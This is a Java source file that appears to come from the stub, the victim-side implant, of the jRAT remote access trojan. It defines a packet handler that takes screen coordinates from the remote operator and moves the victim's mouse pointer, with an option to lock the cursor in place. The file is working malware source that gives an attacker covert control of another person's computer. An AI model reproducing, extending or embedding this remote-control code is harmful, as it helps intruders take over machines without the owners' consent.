package io.jrat.stub.packets.incoming;

import io.jrat.common.utils.Utils;
import io.jrat.stub.Connection;
import io.jrat.stub.MouseLock;
import io.jrat.stub.utils.ScreenUtils;

public class Packet91MouseMove extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		int x = con.readInt();
		int y = con.readInt();
		int monitor = con.readInt();
		
		if (!Utils.isHeadless()) {
			if (MouseLock.isEnabled()) {
				MouseLock.setPos(x, y);
			}

			if (monitor == -1) {
				ScreenUtils.getDefault().mouseMove(x, y);
			} else {
				ScreenUtils.getAllRobots()[monitor].mouseMove(x, y);
			}
		}
	}

}
